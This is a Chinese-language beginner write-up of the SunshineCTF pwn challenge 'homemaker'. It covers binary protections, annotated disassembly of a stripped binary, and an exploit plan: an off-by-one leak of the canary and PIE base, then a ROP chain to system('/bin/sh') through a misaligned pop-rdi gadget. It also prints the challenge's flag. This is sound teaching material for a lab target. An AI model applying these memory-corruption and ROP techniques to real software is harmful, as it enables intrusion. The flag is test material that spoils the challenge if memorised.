# SunshineCTF — `homemaker` (Pwn / 堆疊溢位 + ROP) 完全新手教學筆記

> 這份筆記假設你**完全沒聽過 ROP / SROP**，只會一點 C 跟「暫存器」這個詞。
> 所有位址、offset 都是實際用 `objdump` 與 `gdb` 量出來的（指令與輸出都附在文件裡），沒有任何一個是猜的。
> 真實 flag：`sun{the_future_is_now_today_well_wait_how_are_you_reading_this}`

---

## 0. 題目資訊

| 項目 | 內容 |
|---|---|
| 題目 | `homemaker`（Apex Atomic Model 7 "HOMEMAKER" 家事自動人偶） |
| 類型 | pwn / 64-bit ELF、stack buffer overflow、off-by-one、ROP |
| 本地檔案 | `./homemaker`（PIE、x86-64、stripped、有 canary、NX、Full RELRO） |
| 遠端 | `chal.sunshinectf.games:26008`（Ubuntu 22.04 建置，glibc 2.35；本機是 Arch glibc 2.44） |
| 編譯器 | `GCC: (Ubuntu 11.4.0-1ubuntu1~22.04.2) 11.4.0`（字串裡就有） |
| 保護 | PIE + Canary + NX + **Full RELRO** + 有 `endbr64`（CET 標記，但**未被強制啟用**） |
| 漏洞 | `APPEND` 指令處理函式（offset `0x174c`）的 **off-by-one**：檢查 `n <= capacity` 但迴圈寫了 `n+1` 個 byte，剛好蓋到 16-bit `capacity` 的低位 byte → `0x0100` 變成 `0x01ff`（容量變大 255） |
| 利用 | 用容量變大後的 `SEND STATE`（`0x1810`）洩漏 `0x1ff` bytes 堆疊（canary / saved rbp / 回傳位址 → PIE base）→ 再 `APPEND` 一次蓋掉回傳位址 → ROP → `system("/bin/sh")` → 讀 flag |
| 是否需要 libc | **不需要**！整條 ROP 只用題目自身的 PIE 位址（`system@plt` + 自己放 `/bin/sh`），所以本機 glibc 2.44 與遠端 2.35 都能打通 |

`checksec` 輸出（`pwn checksec` / `pwntools`）：

```
RELRO:      Full RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        PIE enabled
RUNPATH:    b'$ORIGIN'
SHSTK:      Enabled      <-- 只是 ELF 標記，實際沒啟用（不然 ret 到非回傳位址會直接死）
IBT:        Enabled      <-- 同上
```

> （`checksec` 的輸出順序就是上面這樣：`RELRO` → `Stack` → `NX` → `PIE` → `RUNPATH` → `SHSTK` → `IBT`。）

---

## 1. 保護機制：它們到底是什麼、對解題造成什麼影響

### 1.1 ASLR（Address Space Layout Randomization）

每次程式啟動時，**堆疊、libc、執行檔本體（若是 PIE）、heap** 的位址都會被隨機平移一段。
所以「程式中某個變數在 `0x7ffc1234abcd`」這種位址每次都不一樣 → 你**不能寫死位址**，必須先「洩漏（leak）一個真實位址」，再用「相對位移」回推基底。

### 1.2 PIE（Position Independent Executable）

執行檔本身被編譯成「位置無關」，載入時整張 image 會被搬到隨機基底 `PIE_base`。
`objdump` 看到的位址（例如 `main` 在 `0x1a7f`）都只是**檔案內的 offset**，
執行時真正的位址 = `PIE_base + 0x1a7f`。

> **為什麼 PIE 需要先洩漏位址？**
> 因為 ROP 需要「gadget 的絕對位址」寫進堆疊。你不知道 `PIE_base`，就不知道 `pop rdi; ret` 在哪裡。
> 本題靠洩漏堆疊上一個「指回 main 的回傳位址」（`PIE_base + 0x1a9f`）來反推 `PIE_base`（見 §5）。
> 驗證方式：`PIE_base` 一定是 0x1000 對齊（page 對齊），洩漏值減掉 offset 後若剛好是 `xxxx000`，就代表算對了。

### 1.3 Canary（Stack Guard / 堆疊金絲雀）

每個函式開頭會把一個執行緒專屬的隨機 8 bytes 從 `fs:0x28`（TLS，Thread Local Storage）複製到堆疊 `[rbp-8]`；
函式結束前再比較一次，不一致就呼叫 `__stack_chk_fail` → `abort()`（你會看到 `*** stack smashing detected ***`）。

組語長這樣（本題 `checksum` 函式起點是 `0x11e9`；下面是它載入金絲雀的那一段）：

```asm
11ff: 64 48 8b 04 25 28 00 00 00   mov rax,QWORD PTR fs:0x28   ; 拿出金絲雀
1208: 48 89 45 f8                  mov QWORD PTR [rbp-0x8],rax ; 放到 [rbp-8]
...
1273: 48 8b 55 f8                  mov rdx,QWORD PTR [rbp-0x8] ; 再讀回來
1277: 64 48 2b 14 25 28 00 00 00   sub rdx,QWORD PTR fs:0x28   ; 跟原始值比
1280: 74 05                        je  1287
1282: e8 29 fe ff ff               call 10b0 <__stack_chk_fail@plt>
```

**對解題的影響**：溢位時 `[rbp-8]` 會被你蓋掉 → 必須「原封不動寫回正確的金絲雀」。
因此**先 leak 金絲雀**是必要步驟（本題的金絲雀低位 byte 一定是 `0x00`，但我們是整條 8 bytes 洩漏出來的，不需要暴力猜）。

### 1.4 NX（No-eXecute，DEP）

資料段／堆疊／heap 被標成不可執行 → **不能把 shellcode 寫到堆疊上跳過去執行**。
所以我們改用 **ROP（Return-Oriented Programming）**：借用程式自己已經存在的指令片段來組出攻擊邏輯。

### 1.5 RELRO / Full RELRO —— 為什麼「GOT 覆寫」行不通

- **GOT（Global Offset Table）**：動態連結的函式（如 `system`、`read`）第一次被呼叫時，由 PLT 透過 GOT 跳到 `ld.so` 解析真正的 libc 位址，然後把解析結果**寫回 GOT**；第二次之後就直接從 GOT 跳。
  於是傳統攻擊手法是：把 `GOT[某函式]` 改成 `system`，再觸發那個函式 → 直接拿到 shell。
- **RELRO**：載入時把 GOT（以及 `.init_array`/`.fini_array`/`.dynamic`）改成**唯讀**。
  - *Partial RELRO*：只保護 `.init_array` 等，GOT 仍可寫 → 可以 GOT 覆寫。
  - **Full RELRO**：連 `.got.plt` 都在載入時全部解析完並 `mprotect(PROT_READ)` → **GOT 完全不能寫**。

本題 `checksec` 顯示 `Full RELRO`，而且 `readelf -r` 顯示 `.rela.plt` 有 6 個 `R_X86_64_JUMP_SLO`（`write/system/read/memcpy/setvbuf/__stack_chk_fail`），全部在載入時就被填好。

> 結論：**GOT 覆寫這條路直接封死**。但 Full RELRO 有個副作用對我們有利：
> **所有 PLT 項目都已解析完成**，所以你隨時可以直接 `call system@plt`（不需要先觸發一次）。

### 1.6 CET（SHSTK / IBT）在這裡不影響

`readelf`/`checksec` 會說 `SHSTK: Enabled, IBT: Enabled`，那只是編譯器加了 `endbr64` 與 GNU property 標記。
Shadow Stack（SHSTK）若真的啟用，`ret` 只能回到「真正的回傳位址」，ROP 會失效；但 Linux distro 預設**沒有**啟用（需要 CPU 支援 + 核心 + glibc 都開）。
本題實測 ROP 可用（local 與 remote 都成功），所以可以放心。
另外 **IBT 只檢查間接 `call`/`jmp` 的目標，不檢查 `ret`**，所以我們用「未對齊的 gadget」（見 §6）也是合法的。

---

## 2. 逆向總覽：程式在做什麼

stripped（無符號），所以只能靠 `objdump` + 交叉比對。函式地圖（**都是 PIE 相對 offset**）：

| offset | 我給的名字 | 功能 |
|---|---|---|
| `0x11e9` | `checksum(buf, len)` | 8-bit CRC（多項式 `0x2f`），回傳 1 byte |
| `0x1289` | `validate(magic)` | `magic == 0x1337c35f` 回 0，否則 -1 |
| `0x12d2` | `cmd_echo()` | `system("/bin/echo -n ''")` |
| `0x1313` | `readn(buf, len)` | 從 **fd 0** 迴圈 `read` 到收滿 `len` bytes |
| `0x13a2` | `send_frame(status, data, len)` | 打包成 `ESC[` 訊框寫到 **fd 1** |
| `0x14cc` | `recv_frame(outbuf, *outlen, *err)` | 從 fd 0 解析一個訊框 |
| `0x167c` | `auth(state, payload, len)` | 「服務鑰匙卡」檢查；成功則寫入 `capacity=0x100` |
| `0x174c` | `append(state, payload, len)` | **漏洞所在**：把 payload 資料寫進 `state[]` |
| `0x1810` | `send_state(state)` | `send_frame(0, state, state[0x100])` → **洩漏堆疊** |
| `0x1865` | `service_loop()` | 主迴圈：收訊框 → 依 opcode 分派 |
| `0x1a7f` | `main()` | 呼叫 `service_loop()` |
| `0x1aba` | `init()` | `setvbuf(stdout/stderr, NULL, _IONBF, 0)` |

### 2.1 通訊協定（ESC 訊框）

**客戶端 → 伺服器**（`recv_frame` 解析，長度欄位是**大端序 big-endian**！）：

```
+--------+--------+---------------------+--------+--------+
| 1b 5b  | LL LL  | payload (L bytes)   |  crc   | 1b 5c  |
|  ESC[  | L 大端 | payload[0]=opcode   | CRC8   |  ESC\  |
+--------+--------+---------------------+--------+--------+
   4 bytes header     L bytes          1 byte    2 bytes
```

- `L` 限制：`L != 0` 且 `L+7 <= 0x800` → **L 最大 0x7f9**。
- `crc = checksum(payload, L)`，用 §5.1 的演算法自己算。

**伺服器 → 客戶端**（`send_frame` 產生，**同一個 parser 可以解析**）：

```
ESC[ | (len+1) 大端 | status | data(len bytes) | crc | ESC\
```

也就是說：伺服器訊框的「status」欄位正好對應客戶端訊框的「opcode」欄位，協定是對稱的。

### 2.2 opcode 分派表（jump table @ `.rodata:0x21c8`）

```asm
1958: 89 c0                  mov    eax,eax
195a: 48 8d 14 85 00 00 00 00  lea  rdx,[rax*4+0x0]
1962: 48 8d 05 5f 08 00 00   lea    rax,[rip+0x85f]   # 21c8
1969: 8b 04 02               mov    eax,DWORD PTR [rdx+rax*1]
196c: 48 98                  cdqe
196e: 48 8d 15 53 08 00 00   lea    rdx,[rip+0x853]   # 21c8
1975: 48 01 d0               add    rax,rdx
1978: 3e ff e0               notrack jmp rax
```

`.rodata` 內容（`0x21c8` 起 6 個 int32，內容是「相對 0x21c8 的位移」）：

| opcode | 表內值 | 目標 | 意義 |
|---|---|---|---|
| 0 | `0xfffff887` (-1913) | `0x1a4f` | 非法指令 → 回應 status `0xe7` |
| 1 | `0xfffff7b3` (-2125) | `0x197b` | **AUTH**（唯一不需要先登入的指令） |
| 2 | `0xfffff80c` (-2036) | `0x19d4` | **APPEND**（漏洞） |
| 3 | `0xfffff845` (-1979) | `0x1a0d` | **SEND STATE**（洩漏） |
| 4 | `0xfffff871` (-1935) | `0x1a39` | **EJECT**：離開迴圈 → `main` 返回 → **觸發 ROP** |
| 5 | `0xfffff856` (-1962) | `0x1a1e` | **ECHO**：`system("/bin/echo -n ''")`（固定的字串，**沒有注入點**） |

> 注意：題目給的提示說 `/bin/echo -n ''` 可能是 command injection。
> **逆向後確認它是寫死的 `lea rax,[rip+0xec2]`（指向 `.rodata:0x21b6`）**，沒有任何使用者輸入被接進字串，
> 所以 (d)「shell 注入」是假線索，真正的是 (b)/(c) 類的**記憶體破壞**。

登入檢查（`0x191c`）：`if (payload[0] != 1 && !authed) → status 0xe6 "not authenticated"`。

---

## 3. 基礎補課：讀組語前一定要知道的事

### 3.1 x86-64 常用暫存器

| 暫存器 | 用途 | 本題重點 |
|---|---|---|
| `rax` | 回傳值 / 累加器 | 函式回傳值放這裡（例如 `checksum` 回傳的 CRC） |
| `rdi` | **第 1 個參數** | `system("/bin/sh")` 的字串指標必須放這裡 |
| `rsi` | 第 2 個參數 | `memcpy` 的來源、`read` 的 buffer |
| `rdx` | 第 3 個參數 | `memcpy`/`read` 的長度 |
| `rcx`, `r8`, `r9` | 第 4~6 個參數 | |
| `rbp` | frame pointer（此函式堆疊框架的基準） | 區域變數都用 `[rbp-XX]` 表示 |
| `rsp` | stack pointer（堆疊頂端，永遠指向「最後壓入的東西」） | `push` 會減 8，`pop` 會加 8 |
| `rip` | 下一道要執行的指令位址 | ROP 就是控制 `rip` |
| `fs` | 執行緒區域儲存區基底 | 金絲雀在 `fs:0x28` |

命名規則：`eax` = `rax` 的低 32 bits，`ax` = 低 16 bits，`al` = 低 8 bits。
`movzx eax, WORD PTR [..]` = 「讀 2 bytes 零擴展成 32 bits」（不會把高位垃圾帶進來）。

### 3.2 System V AMD64 呼叫慣例（Linux x86-64 的函式呼叫規則）

1. 前 6 個整數/指標參數依序放 **`rdi, rsi, rdx, rcx, r8, r9`**，第 7 個之後才放堆疊。
2. 回傳值放 `rax`。
3. 呼叫端用 `call`：它會**自動把回傳位址 push 到堆疊**（`rsp -= 8`）然後跳到目標。
4. 被呼叫的函式結尾用 `ret`：它會**從堆疊 pop 一個 8 bytes 當作新 `rip`**（`rsp += 8`）。
5. **`rsp` 在「進入函式那一刻」必須是 `16` 的倍數 + 8**（因為 `call` 剛壓了 8 bytes 的回傳位址）。
   很多 libc 函式（含 `system`）內部會用 `movaps`，要求 16-byte 對齊，否則會 **SIGSEGV**。這就是 §6.3「多放一個 `ret`」的原因。

### 3.3 常見指令

| 指令 | 意思 |
|---|---|
| `push rbp` | `rsp -= 8`，把 `rbp` 的值寫到 `[rsp]` |
| `pop rbp` | 把 `[rsp]` 讀進 `rbp`，`rsp += 8` |
| `mov rbp, rsp` | 讓 `rbp` 指向目前堆疊頂（建立本函式的 frame） |
| `sub rsp, 0x120` | 在堆疊上「開空間」給區域變數用 |
| `call X` | `push 下一道指令位址` → `jmp X` |
| `ret` | `pop rip`（**ROP 的核心**） |
| **`leave`** | 等於 `mov rsp, rbp` + `pop rbp`（拆掉 frame） |
| `lea rax,[rip+0xec2]` | 把「PC 相對位移後的位址」算進 `rax`（**PIE 程式中取字串位址的標準寫法**） |
| `mov [rbp-0x8], rax` | 寫記憶體（Intel 語法：目的地在前） |
| `endbr64` | CET 的「合法間接跳躍目標」標記，不影響資料流 |

函式進場/退場的固定樣板（prologue / epilogue）：

```asm
;; prologue
push rbp            ; 保存呼叫者的 rbp
mov  rbp, rsp       ; 建立自己的 frame
sub  rsp, 0x120     ; 開區域變數空間
mov  rax, fs:0x28   ; 放金絲雀
mov  [rbp-0x8], rax

;; ... 函式本體 ...

;; epilogue
mov  rax,[rbp-0x8]  ; 檢查金絲雀
sub  rax, fs:0x28
je   ok
call __stack_chk_fail
ok: leave           ; rsp=rbp; pop rbp
    ret             ; pop rip  <-- 這裡就是我們要劫持的地方
```

### 3.4 堆疊框架（stack frame）長相

```
        高位址
        ┌─────────────────────────────┐
        │ 呼叫者的區域變數 ...        │
        ├─────────────────────────────┤
        │ 回傳位址 (call 壓進來的)    │ ← ret 會把這個 pop 進 rip
        ├─────────────────────────────┤
 rbp →  │ 呼叫者的 rbp (push rbp)     │
        ├─────────────────────────────┤
        │ 本函式區域變數（[rbp-0x8]…）│
        │ ...                         │
 rsp →  └─────────────────────────────┘
        低位址
```

### 3.5 PLT / GOT（動態連結速成）

- `system@plt`（本題 `0x10c0`）是**你自己的程式裡的一段小跳板**：`jmp QWORD PTR [rip+0x2eed]`（跳到 GOT）。
- GOT（`0x3fb8`）裡存的是 libc `system` 的真正位址；第一次呼叫時由 `ld.so` 填好。
- Full RELRO 下載入時就全部填好且不可寫 → 我們**呼叫 PLT 是合法且穩定的**，不需要知道 libc 版本。

```asm
00000000000010c0 <system@plt>:
    10c0: f3 0f 1e fa          endbr64
    10c4: f2 ff 25 ed 2e 00 00 bnd jmp QWORD PTR [rip+0x2eed]   # 3fb8 <system@got>
```

### 3.6 本題用到的 libc 函式行為

| 函式 | 行為 |
|---|---|
| `read(fd, buf, n)` | 讀最多 `n` bytes，**回傳實際讀到幾個**（0 = EOF，-1 = 錯誤）。所以「讀滿 N bytes」必須寫迴圈（本題 `readn`）。 |
| `memcpy(dst, src, n)` | 從 `src` 複製 `n` bytes 到 `dst`，**完全不檢查邊界**（危險，但本題的 `memcpy` 反而有邊界檢查）。 |
| `write(fd, buf, n)` | 把 `n` bytes 寫出去，回傳寫出的數量。 |
| `system(cmd)` | 用 `/bin/sh -c cmd` 執行字串。若字串是 `"/bin/sh"` 就會**開一個互動 shell**（繼承 stdin/stdout，所以我們能透過 socket 下指令）。 |

---

## 4. 逐行組語解說

> 以下都是 `objdump -d -M intel ./homemaker` 的真實輸出（位址是 PIE 相對 offset）。
> 註解是我加的。這份清單已經涵蓋所有對解題重要的函式。

### 4.1 `checksum` @ `0x11e9`（訊框 CRC，8-bit，多項式 0x2f）

```asm
11e9: f3 0f 1e fa            endbr64
11ed: 55                     push   rbp
11ee: 48 89 e5               mov    rbp,rsp
11f1: 48 83 ec 20            sub    rsp,0x20              ; 開 0x20 bytes 區域變數
11f5: 48 89 7d e8            mov    [rbp-0x18],rdi        ; 參數1 = buf
11f9: 89 f0                  mov    eax,esi               ; 參數2 = len（16-bit，用 esi 傳）
11fb: 66 89 45 e4            mov    [rbp-0x1c],ax         ; 存成 WORD
11ff: 64 48 8b 04 25 28 00 00 00   mov rax,QWORD PTR fs:0x28   ; 讀金絲雀
1208: 48 89 45 f8            mov    [rbp-0x8],rax         ; 放進 [rbp-8]
120c: 31 c0                  xor    eax,eax               ; 金絲雀放好後 eax 歸零（可省略）
120e: c6 45 f1 00            mov    BYTE PTR [rbp-0xf],0x0 ; acc = 0        ← 累加器
1212: 66 c7 45 f2 00 00      mov    WORD PTR [rbp-0xe],0x0 ; i = 0          ← 迴圈索引
1218: eb 4b                  jmp    1265                  ; 先跳到「條件判斷」
121a: 0f b7 55 f2            movzx  edx,WORD PTR [rbp-0xe] ; edx = i
121e: 48 8b 45 e8            mov    rax,[rbp-0x18]        ; rax = buf
1222: 48 01 d0               add    rax,rdx               ; rax = buf + i
1225: 0f b6 00               movzx  eax,BYTE PTR [rax]    ; eax = buf[i]
1228: 30 45 f1               xor    BYTE PTR [rbp-0xf],al ; acc ^= buf[i]  ← CRC 第一步
122b: c7 45 f4 00 00 00 00   mov    DWORD PTR [rbp-0xc],0x0 ; j = 0
1232: eb 20                  jmp    1254
1234: 0f b6 45 f1            movzx  eax,BYTE PTR [rbp-0xf] ; eax = acc
1238: 84 c0                  test   al,al
123a: 79 0b                  jns    1247                  ; 若 bit7 = 0 跳去 1247
123c: 0f b6 45 f1            movzx  eax,BYTE PTR [rbp-0xf] ; （bit7 = 1 分支）
1240: 01 c0                  add    eax,eax               ; acc <<= 1
1242: 83 f0 2f               xor    eax,0x2f              ; acc ^= 0x2f   ← CRC 多項式
1245: eb 06                  jmp    124d
1247: 0f b6 45 f1            movzx  eax,BYTE PTR [rbp-0xf]
124b: 01 c0                  add    eax,eax               ; acc <<= 1（不做 xor）
124d: 88 45 f1               mov    BYTE PTR [rbp-0xf],al ; 寫回 acc
1250: 83 45 f4 01            add    DWORD PTR [rbp-0xc],0x1 ; j++
1254: 83 7d f4 07            cmp    DWORD PTR [rbp-0xc],0x7 ; j <= 7 ?
1258: 7e da                  jle    1234                  ; 迴圈 8 次
125a: 0f b7 45 f2            movzx  eax,WORD PTR [rbp-0xe] ; i
125e: 83 c0 01               add    eax,0x1               ; i+1
1261: 66 89 45 f2            mov    WORD PTR [rbp-0xe],ax ; i++
1265: 0f b7 45 f2            movzx  eax,WORD PTR [rbp-0xe]
1269: 66 3b 45 e4            cmp    ax,WORD PTR [rbp-0x1c] ; i < len ?
126d: 72 ab                  jb     121a                  ; 是就繼續
126f: 0f b6 45 f1            movzx  eax,BYTE PTR [rbp-0xf] ; 回傳 acc
1273: 48 8b 55 f8            mov    rdx,[rbp-0x8]         ; 檢查金絲雀…
1280: 74 05                  je     1287
1282: e8 29 fe ff ff         call   10b0 <__stack_chk_fail@plt>
1287: c9                     leave
1288: c3                     ret
```

**Python 等價實作**（`exploit.py` 裡就是這個）：

```python
def crc8(data):
    acc = 0
    for b in data:
        acc ^= b
        for _ in range(8):
            acc = ((acc << 1) ^ 0x2f) & 0xff if acc & 0x80 else (acc << 1) & 0xff
    return acc
```

### 4.2 `validate` @ `0x1289`（鑰匙卡魔數）——順便藏了 `pop rdi; ret`！

```asm
1289: f3 0f 1e fa            endbr64
128d: 55                     push   rbp
128e: 48 89 e5               mov    rbp,rsp
1291: 48 83 ec 20            sub    rsp,0x20
1295: 89 7d ec               mov    [rbp-0x14],edi        ; 參數 = magic（32-bit）
1298: 64 48 8b 04 25 28 00 00 00   mov rax,QWORD PTR fs:0x28
12a1: 48 89 45 f8            mov    [rbp-0x8],rax         ; 金絲雀
12a5: 31 c0                  xor    eax,eax
12a7: 81 7d ec 5f c3 37 13   cmp    DWORD PTR [rbp-0x14],0x1337c35f   ; ★ 關鍵比較
12ae: 74 07                  je     12b7                  ; 相等 → 回 0（成功）
12b0: b8 ff ff ff ff         mov    eax,0xffffffff        ; 否則回 -1
12b5: eb 05                  jmp    12bc
12b7: b8 00 00 00 00         mov    eax,0x0
12bc: 48 8b 55 f8            mov    rdx,[rbp-0x8]         ; 金絲雀檢查
12c0: 64 48 2b 14 25 28 00 00 00   sub rdx,QWORD PTR fs:0x28
12c9: 74 05                  je     12d0
12cb: e8 e0 fd ff ff         call   10b0 <__stack_chk_fail@plt>
12d0: c9                     leave
12d1: c3                     ret
```

★ 為什麼關鍵？看 `0x12a7` 的 7 個 byte：`81 7d ec | 5f c3 37 13`。
最後 4 bytes 是立即值 `0x1337c35f`（小端序存成 `5f c3 37 13`）。
如果 `rip` 跳到 **`0x12aa`**（也就是立即值的中間），CPU 看到的是：

```
5f      pop rdi
c3      ret
```

→ 我們白撿到一個 **`pop rdi; ret` gadget**（而且是題目故意用 `0x1337c35f` 這個魔數「送」給你的）！
本題 `pop rdi; ret = PIE_base + 0x12aa`。

> 教學重點：**gadget 不需要對齊**。x86 是變長指令集，從任何 byte 開始解碼都合法，
> 所以 `ROPgadget` 會找到一大堆「未對齊」gadget。IBT 只檢查間接 `call/jmp`，不檢查 `ret`，所以可用。

### 4.3 `cmd_echo` @ `0x12d2`（opcode 5 → `system()`）

```asm
12d2: f3 0f 1e fa            endbr64
12d6: 55                     push   rbp
12d7: 48 89 e5               mov    rbp,rsp
12da: 48 83 ec 10            sub    rsp,0x10
12de: 64 48 8b 04 25 28 00 00 00   mov rax,QWORD PTR fs:0x28
12e7: 48 89 45 f8            mov    [rbp-0x8],rax
12eb: 31 c0                  xor    eax,eax
12ed: 48 8d 05 c2 0e 00 00   lea    rax,[rip+0xec2]       ; → .rodata:0x21b6
12f4: 48 89 c7               mov    rdi,rax               ; rdi = 字串（第 1 參數）
12f7: e8 c4 fd ff ff         call   10c0 <system@plt>     ; system(rdi)
12fc: 90                     nop
```

`.rodata:0x21b6` 的內容是 `"/bin/echo -n ''"`（`objdump -s -j .rodata` 可見 `2f 62 69 6e 2f 65 63 68 6f 20 2d 6e 20 27 27 00`）。

**這裡證明：字串是固定的、完全沒有使用者輸入** → 沒有 command injection。

### 4.4 `readn` @ `0x1313`（讀滿 N bytes）

```asm
1313: f3 0f 1e fa            endbr64
1317: 55                     push   rbp
1318: 48 89 e5               mov    rbp,rsp
131b: 48 83 ec 30            sub    rsp,0x30
131f: 48 89 7d d8            mov    [rbp-0x28],rdi        ; buf
1323: 48 89 75 d0            mov    [rbp-0x30],rsi        ; len
1327: 64 48 8b 04 25 28 00 00 00   mov rax,QWORD PTR fs:0x28
1330: 48 89 45 f8            mov    [rbp-0x8],rax
1336: 48 c7 45 e8 00 00 00 00  mov QWORD PTR [rbp-0x18],0x0  ; off = 0（已讀量）
133e: eb 3d                  jmp    137d
1340: 48 8b 45 d0            mov    rax,[rbp-0x30]        ; len
1344: 48 2b 45 e8            sub    rax,[rbp-0x18]        ; len - off  → 還要讀多少
1348: 48 8b 4d d8            mov    rcx,[rbp-0x28]
134c: 48 8b 55 e8            mov    rdx,[rbp-0x18]
1350: 48 01 d1               add    rcx,rdx               ; buf + off
1353: 48 89 c2               mov    rdx,rax               ; 參數3 = count
1356: 48 89 ce               mov    rsi,rcx               ; 參數2 = buf+off
1359: bf 00 00 00 00         mov    edi,0x0               ; 參數1 = fd 0 (stdin)
135e: e8 6d fd ff ff         call   10d0 <read@plt>
1363: 48 89 45 f0            mov    [rbp-0x10],rax        ; n = read(...)
1367: 48 83 7d f0 00         cmp    QWORD PTR [rbp-0x10],0x0
136c: 7f 07                  jg     1375                  ; n > 0 → 繼續
136e: b8 ff ff ff ff         mov    eax,0xffffffff        ; EOF/錯誤 → 回 -1
1373: eb 17                  jmp    138c
1375: 48 8b 45 f0            mov    rax,[rbp-0x10]
1379: 48 01 45 e8            add    [rbp-0x18],rax        ; off += n
137d: 48 8b 45 e8            mov    rax,[rbp-0x18]
1381: 48 3b 45 d0            cmp    rax,[rbp-0x30]        ; off < len ?
1385: 72 b9                  jb     1340                  ; 是 → 再讀
1387: b8 00 00 00 00         mov    eax,0x0               ; 成功
```

### 4.5 `send_frame` @ `0x13a2`（組訊框 + `memcpy` + `write`）

```asm
13a2: f3 0f 1e fa            endbr64
13a6: 55                     push   rbp
13a7: 48 89 e5               mov    rbp,rsp
13aa: 53                     push   rbx                   ; 保存 rbx（callee-saved）
13ab: 48 83 ec 28            sub    rsp,0x28
13af: 89 f9                  mov    ecx,edi               ; status
13b1: 48 89 75 d0            mov    [rbp-0x30],rsi        ; data
13b5: 89 d0                  mov    eax,edx               ; len
13b7: 89 ca                  mov    edx,ecx
13b9: 88 55 dc               mov    BYTE PTR [rbp-0x24],dl ; status（1 byte）
13bc: 66 89 45 d8            mov    WORD PTR [rbp-0x28],ax ; len（2 bytes）
13c0: 64 48 8b 04 25 28 00 00 00   mov rax,QWORD PTR fs:0x28
13c9: 48 89 45 e8            mov    [rbp-0x18],rax        ; 金絲雀
13cf: 0f b7 45 d8            movzx  eax,WORD PTR [rbp-0x28] ; len
13d3: 83 c0 01               add    eax,0x1               ; len+1
13d6: 66 89 45 e6            mov    WORD PTR [rbp-0x1a],ax ; n1 = len + 1（含 status）
13da: 0f b7 45 e6            movzx  eax,WORD PTR [rbp-0x1a]
13de: 48 83 c0 07            add    rax,0x7
13e2: 48 3d 00 08 00 00      cmp    rax,0x800
13e8: 0f 87 c3 00 00 00      ja     14b1                  ; n1+7 > 0x800 → 放棄（保護）
13ee: c6 05 6b 2c 00 00 1b   mov    BYTE PTR [rip+0x2c6b],0x1b   # 4060 = ESC
13f5: c6 05 65 2c 00 00 5b   mov    BYTE PTR [rip+0x2c65],0x5b   # 4061 = '['
13fc: 0f b7 45 e6            movzx  eax,WORD PTR [rbp-0x1a]
1400: 66 c1 e8 08            shr    ax,0x8
1404: 88 05 58 2c 00 00      mov    BYTE PTR [rip+0x2c58],al     # 4062 = n1 高位
140a: 0f b7 45 e6            movzx  eax,WORD PTR [rbp-0x1a]
140e: 88 05 4f 2c 00 00      mov    BYTE PTR [rip+0x2c4f],al     # 4063 = n1 低位
1414: 0f b6 45 dc            movzx  eax,BYTE PTR [rbp-0x24]
1418: 88 05 46 2c 00 00      mov    BYTE PTR [rip+0x2c46],al     # 4064 = status
141e: 66 83 7d d8 00         cmp    WORD PTR [rbp-0x28],0x0
1423: 74 1a                  je     143f                  ; len==0 → 跳過 memcpy
1425: 0f b7 55 d8            movzx  edx,WORD PTR [rbp-0x28] ; 參數3 = len
1429: 48 8d 0d 35 2c 00 00   lea    rcx,[rip+0x2c35]     ; 4065 = txbuf+5
1430: 48 8b 45 d0            mov    rax,[rbp-0x30]
1434: 48 89 c6               mov    rsi,rax               ; 參數2 = data
1437: 48 89 cf               mov    rdi,rcx               ; 參數1 = txbuf+5
143a: e8 a1 fc ff ff         call   10e0 <memcpy@plt>     ; memcpy(txbuf+5, data, len)
143f: 0f b7 45 e6            movzx  eax,WORD PTR [rbp-0x1a]
1443: 48 8d 15 1a 2c 00 00   lea    rdx,[rip+0x2c1a]     ; 4064
144a: 0f b7 4d e6            movzx  ecx,WORD PTR [rbp-0x1a]
144e: 8d 59 04               lea    ebx,[rcx+0x4]
1451: 89 c6                  mov    esi,eax               ; 參數2 = n1
1453: 48 89 d7               mov    rdi,rdx               ; 參數1 = txbuf+4
1456: e8 8e fd ff ff         call   11e9                 ; checksum(txbuf+4, n1)
145b: 48 63 d3               movsxd rdx,ebx               ; rdx = n1+4
145e: 48 8d 0d fb 2b 00 00   lea    rcx,[rip+0x2bfb]     ; 4060
1465: 88 04 0a               mov    BYTE PTR [rdx+rcx*1],al ; txbuf[n1+4] = crc
1468..1498: 在 txbuf[n1+5]=0x1b、txbuf[n1+6]=0x5c 寫入結尾
1490: 0f b7 45 e6            movzx  eax,WORD PTR [rbp-0x1a]
1494: 48 83 c0 07            add    rax,0x7               ; 總長 = n1+7
14a2: 48 89 c6               mov    rsi,rax               ; ← txbuf（4060）
14a5: bf 01 00 00 00         mov    edi,0x1               ; fd = 1 (stdout)
14aa: e8 f1 fb ff ff         call   10a0 <write@plt>      ; write(1, txbuf, n1+7)
```

> 全域 `txbuf` 在 `.bss:0x4060`，長度上限剛好 `0x800`（`0x4060 + 0x800 = 0x4860`）。

### 4.6 `recv_frame` @ `0x14cc`（解析訊框 —— 檢查邏輯，含長度上限）

```asm
14cc: f3 0f 1e fa            endbr64
14d0: 55                     push   rbp
14d1: 48 89 e5               mov    rbp,rsp
14d4: 53                     push   rbx
14d5: 48 83 ec 38            sub    rsp,0x38
14d9: 48 89 7d d8            mov    [rbp-0x28],rdi        ; outbuf
14dd: 48 89 75 d0            mov    [rbp-0x30],rsi        ; *outlen
14e1: 48 89 55 c8            mov    [rbp-0x38],rdx        ; *err
14f4: 48 8b 45 d8            mov    rax,[rbp-0x28]
14f8: be 04 00 00 00         mov    esi,0x4
1500: e8 0e fe ff ff         call   1313                 ; readn(outbuf, 4) 讀檔頭
1513..1532: 讀 outbuf[0..1] 組成 big-endian magic → [rbp-0x1e]
1536: 66 81 7d e2 5b 1b      cmp    WORD PTR [rbp-0x1e],0x1b5b    ; "ESC["
153c: 74 11                  je     154f
153e: 48 8b 45 c8            mov    rax,[rbp-0x38]
1542: c6 00 e1               mov    BYTE PTR [rax],0xe1   ; *err = 0xe1（magic 錯）
154f..1572: 讀 outbuf[2..3] 組成 big-endian L → [rbp-0x1c]
1576: 66 83 7d e4 00         cmp    WORD PTR [rbp-0x1c],0x0
157b: 74 10                  je     158d                  ; L == 0 → 錯誤
157d: 0f b7 45 e4            movzx  eax,WORD PTR [rbp-0x1c]
1581: 48 83 c0 07            add    rax,0x7
1585: 48 3d 00 08 00 00      cmp    rax,0x800
158b: 76 11                  jbe    159e                  ; ★ L+7 <= 0x800 才合法
158d: 48 8b 45 c8            mov    rax,[rbp-0x38]
1591: c6 00 e2               mov    BYTE PTR [rax],0xe2   ; *err = 0xe2（長度錯）
